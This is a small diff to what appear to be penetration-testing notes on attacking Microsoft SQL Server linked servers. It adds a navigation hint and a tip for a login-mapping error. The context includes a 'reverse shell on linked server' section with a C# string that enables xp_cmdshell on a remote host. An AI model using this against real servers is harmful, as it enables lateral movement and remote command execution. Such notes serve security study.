@@ -241,7 +241,7 @@ go
 
 
 * View the users required to access linked servers
-  *
+  *   Server Objects --> \<Linked Server Name>
 
       <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>webapp11 acc required to access SQL27</p></figcaption></figure>
 
@@ -621,6 +621,7 @@ reader.Close();
       ```
 
 
+  * If received `Access to the remote server is denied because no login-mapping exists.` --> Check which accounts are able to use linked servers [here](1433-mssql.md#enumeration-within-sql-server-management-studio)
 - Reverse shell on linked server
   *   ```csharp
       //String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"dc01.corp2.com\";";
